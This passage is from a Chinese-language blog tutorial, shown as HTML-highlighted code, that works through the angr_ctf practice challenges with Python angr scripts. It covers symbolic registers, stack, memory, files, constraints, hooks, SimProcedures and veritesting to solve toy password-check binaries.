class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">avoid_me</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  should_succeed = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和最终成功函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">maybe_good</span><span class="params">(<span class="type">char</span> *s1, <span class="type">char</span> *s2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( should_succeed &amp;&amp; !<span class="built_in">strncmp</span>(s1, s2, <span class="number">8u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加avoid</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;dist/01_angr_avoid&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x80485E0</span>, avoid=<span class="number">0x80485A8</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><strong>angr_find_condition</strong></p><p>因为有很多重复代码块，所以这题也有很多可能会输出”Good Job.”的地址，这时候我们像<code>00_angr_find</code>那样设定一个单一的目标地址就不太可能了。不过幸好，explore函数的find参数除了地址外，也可以是一个携带SimState参数的函数，代码如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_avoid</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;dist/02_angr_find_condition&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=is_successful, avoid=should_avoid)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><h4 id="symbolic"><a href="#symbolic" class="headerlink" title="symbolic"></a>symbolic</h4><p>angr在默认情况下只会符号化从标准输入流中读取的数据，而实际情况往往需要我们符号化其他数据，如寄存器、某块内存甚至是某个文件。</p><p><strong>angr_symbolic_registers</strong></p><p>用之前的方法也能跑出答案,</p><p>从用户读取的三个数字被保存到了eax,ebx,edx中</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/03_angr_symbolic_registers&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048980</span>)</span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">state.regs.eax = password0</span><br><span class="line">state.regs.ebx = password1</span><br><span class="line">state.regs.edx = password2</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x80489E6</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password0))&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password1: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password1))&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password2: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password2))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意这里的初始state是通过blank_state函数而不是entry_state函数获得的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048980</span>)</span><br></pre></td></tr></table></figure><p>因为在0x8048980之前的指令对我们的求解其实是没有任何作用的，包括get_user_input函数，因为接下来我们就要将get_user_input函数的结果符号化了，而不是让angr自动帮我们符号化通过scanf读取的数据</p><p><strong>angr_symbolic_stack</strong></p><p>对栈空间内的数据进行符号化</p><p>这题将scanf读取的数据保存在栈上，并且通过ebp索引这些符号值（比如<code>[ebp+var_C]</code>），所以我们得让ebp有一个正确的初值了。之所以说是正确的初值，是因为我们跳过了函数开头对栈的调整，因此我们还需要手动调整ebp的值</p><p>ebp的值是什么不重要，我们只需要保证它和esp的偏移是正确的即可，对前面的汇编指令进行分析我们可以得出此时ebp的偏移量为：0x18+4+4+4+4=40</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state.regs.ebp = state.regs.esp + <span class="number">40</span></span><br></pre></td></tr></table></figure><p>然后对esp的值执行调整，使我们接下来push进去的符号值恰好在[ebp+var_10]和[ebp+var_C]这两个位置，记得push完之后要把esp调回来</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/04_angr_symbolic_stack&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048694</span>)</span><br><span class="line">state.regs.ebp = state.regs.esp + <span class="number">40</span></span><br><span class="line">state.regs.esp = state.regs.ebp - <span class="number">0xC</span> + <span class="number">4</span></span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">state.stack_push(password0)</span><br><span class="line">state.stack_push(password1)</span><br><span class="line">state.regs.esp = state.regs.ebp - <span class="number">40</span></span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x80486E1</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password0))&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password1: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password1))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>angr_symbolic_memory</strong></p><p>用户输入被保存在全局变量中</p><p>完整代码如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/05_angr_symbolic_memory&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x80485FE</span>)</span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">password3 = claripy.BVS(<span class="string">&#x27;password3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">state.mem[<span class="number">0xA1BA1C0</span>].uint64_t = password0</span><br><span class="line">state.mem[<span class="number">0xA1BA1C0</span> + <span class="number">8</span>].uint64_t = password1</span><br><span class="line">state.mem[<span class="number">0xA1BA1C0</span> + <span class="number">16</span>].uint64_t = password2</span><br><span class="line">state.mem[<span class="number">0xA1BA1C0</span> + <span class="number">24</span>].uint64_t = password3</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x804866A</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password0, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password1: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password1, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password2: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password2, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password3: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password3, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果我们要获取内存中的数据（具体值或者符号值），可以这样用：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0xA1BA1C0</span>].uint64_t.resolved</span><br><span class="line">&lt;BV64 password0_0_64&gt;</span><br></pre></td></tr></table></figure><p><strong>angr_symbolic_dynamic_memory</strong></p><p>这题使用了malloc函数来动态分配内存，因此输入的地址就不是固定的</p><p>但我们仍然可以在内存中选定一块区域作为输入的地址，比如说在.bss段选定一块未使用的16字节区域，然后对输入进行符号化</p><p>并将缓冲区的地址设成我们刚刚选定的地址,这样做完全可行,是因为我们初始化的state已经跳过了malloc</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/06_angr_symbolic_dynamic_memory&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048696</span>)</span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">state.mem[<span class="number">0xABCC700</span>].uint64_t = password0</span><br><span class="line">state.mem[<span class="number">0xABCC700</span> + <span class="number">8</span>].uint64_t = password1</span><br><span class="line">state.mem[<span class="number">0xABCC8A4</span>].uint32_t = <span class="number">0xABCC700</span></span><br><span class="line">state.mem[<span class="number">0xABCC8AC</span>].uint32_t = <span class="number">0xABCC700</span> + <span class="number">8</span></span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x8048759</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password0, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password1: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password1, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>angr_symbolic_file</strong></p><p>这题是先把输入写进文件，再从文件中读取输入</p><p>在这题中我们要忽略scanf，直接对文件的内容进行符号化。要对文件内容进行符号化，首先我们要创建一个模拟的文件<code>SimFile</code>，文件名为’OJKSQYDP.txt’，内容为8字节的符号值，大小为0x40字节：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">sim_file = angr.SimFile(name=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span>, content=password0, size=<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure><p>然后插入到state的文件系统（FileSystem）中，state的文件系统可以通过state.fs获得：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state.fs.insert(<span class="string">&#x27;OJKSQYDP.txt&#x27;</span>, sim_file)</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/07_angr_symbolic_file&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x80488D3</span>)</span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">sim_file = angr.SimFile(name=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span>, content=password0, size=<span class="number">0x40</span>)</span><br><span class="line">state.fs.insert(<span class="string">&#x27;OJKSQYDP.txt&#x27;</span>, sim_file)</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x80489AD</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password0, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="constraints"><a href="#constraints" class="headerlink" title="constraints"></a>constraints</h4><p>angr在符号执行的过程中，会将路径约束保存在SimState内置的约束求解器内。</p><p>这题的流程是先对输入加密，然后调用check_equals_xxx函数对加密后的输入进行比较，若比对成功则输出”Good Job.”</p><p>check_equals_AUPDNNPROEZRJWKB函数会将输入与”AUPDNNPROEZRJWKB”进行比较</p><p>这题直接调用explore是跑不出来的，因为在check_equals函数中不是比对失败就立刻退出循环，而是一直循环到最后。总共有16轮循环，每次循环会产生比对成功和比对失败两个状态，所以符号执行总共会产生216个状态，导致<em>路径爆炸</em>：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/08_angr_constraints&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048622</span>)</span><br><span class="line">password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">16</span> * <span class="number">8</span>)</span><br><span class="line">buffer_addr = <span class="number">0x804A050</span></span><br><span class="line">state.memory.store(buffer_addr, password)</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x8048669</span>)<span class="comment"># 执行check_equals_AUPDNNPROEZRJWKB函数之前</span></span><br><span class="line">found = simgr.found[<span class="number">0</span>]</span><br><span class="line">found.add_constraints(found.memory.load(buffer_addr, <span class="number">16</span>) == <span class="string">b&#x27;AUPDNNPROEZRJWKB&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(found.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure><h4 id="hooks"><a href="#hooks" class="headerlink" title="hooks"></a>hooks</h4><p><strong>angr_hooks</strong></p><p>与上题不同的是，这题的比较函数不在整个加密流程的最后，所以我们不能再采用上题手动添加约束并求解的方法</p><p>既然check_equals函数本身的流程非常简单，那么我们就可以用hook技术将check_equals函数替换为一个<strong>等效的并且不会导致路径爆炸的函数</strong>，然后再进行符号执行</p><p>注意这里的hook是对call指令进行了hook，而不是函数本身，length指的是跳过的字节数，call指令占5个字节，所以length=5：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/09_angr_hooks&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@proj.hook(<span class="params">addr=<span class="number">0x80486B3</span>, length=<span class="number">5</span></span>)  </span><span class="comment"># check_equals_XYMKBKUHNIQYNQXE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_check_equals</span>(<span class="params">state</span>):</span><br><span class="line">    buffer_addr = <span class="number">0x804A054</span></span><br><span class="line">    buffer = state.memory.load(buffer_addr, <span class="number">16</span>)</span><br><span class="line">    state.regs.eax = claripy.If(buffer == <span class="string">b&#x27;XYMKBKUHNIQYNQXE&#x27;</span>, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><strong>angr_simprocedures</strong></p><p>现在我们没法hook所有掉call指令了，因为call指令实在是太多了</p><p>接下来我们就要引入一种对函数本身进行hook的方法——SimProcedures，定义一个SimProcedures的代码如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCheckEquals</span>(angr.SimProcedure):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buffer_addr, length</span>):</span><br><span class="line">        buffer = self.state.memory.load(buffer_addr, length)</span><br><span class="line">        <span class="keyword">return</span> claripy.If(buffer == <span class="string">b&#x27;ORSDDWXHZURJRBDH&#x27;</span>, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br></pre></td></tr></table></figure><p>SimProcedure按字面意思来理解就是“模拟程序”，在这里我们用一个SimProcedure的子类MyCheckEquals模拟了check_equals_ORSDDWXHZURJRBDH函数的功能，SimProcedure中的run函数由子类实现，其接收的参数与C语言中的参数保持一致，返回为对应原函数的返回值。</p><p>定义好了SimProcedure之后，我们需要调用hook_symbol函数对程序中名为check_equals_ORSDDWXHZURJRBDH的函数进行hook：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proj.hook_symbol(symbol_name=<span class="string">&#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span>, simproc=MyCheckEquals())</span><br></pre></td></tr></table></figure><p>hook之后angr在符号执行的过程中将不会调用原先的check_equals_ORSDDWXHZURJRBDH函数，而是MyCheckEquals类中的run函数。然后我们就可以用老方法解决这道题了，完整代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCheckEquals</span>(angr.SimProcedure):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buffer_addr, length</span>):</span><br><span class="line">        buffer = self.state.memory.load(buffer_addr, length)</span><br><span class="line">        <span class="keyword">return</span> claripy.If(buffer == <span class="string">b&#x27;ORSDDWXHZURJRBDH&#x27;</span>, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/10_angr_simprocedures&#x27;</span>)</span><br><span class="line">proj.hook_symbol(symbol_name=<span class="string">&#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span>, simproc=MyCheckEquals())</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><strong>angr_sim_scanf</strong></p><p>angr_ctf给的说法是<strong>angr不支持多个参数的scanf</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># This time, the solution involves simply replacing scanf with our own version,</span><br><span class="line"># since Angr does not support requesting multiple parameters with scanf.</span><br></pre></td></tr></table></figure><p>然而实际上是可以的，可能以前的版本不行，毕竟angr版本迭代还是很快的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;/dist/11_angr_sim_scanf&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;1448564819 1398294103&#x27;</span></span><br></pre></td></tr></table></figure><p>angr在angr/procedures中定义了很多模拟系统函数的SimProcedures：</p><p><a href="https://github.com/angr/angr/tree/master/angr/procedures">angr/angr/procedures at master · angr/angr (github.com)</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/11_angr_sim_scanf&#x27;</span>)</span><br><span class="line">proj.hook_symbol(<span class="string">&quot;__isoc99_scanf&quot;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())  <span class="comment">#</span></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><h4 id="veritesting"><a href="#veritesting" class="headerlink" title="veritesting"></a>veritesting</h4><p>缓解路径爆炸的第三种方法——Veritesting</p><p>angr中实现了上述论文中提到的Veritesting技术，我们只需要在构建simgr的时候添加一个<code>veritesting=True</code>参数即可，代码如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simgr = proj.factory.simgr(state, veritesting=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>跑出来还是要花一点时间</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 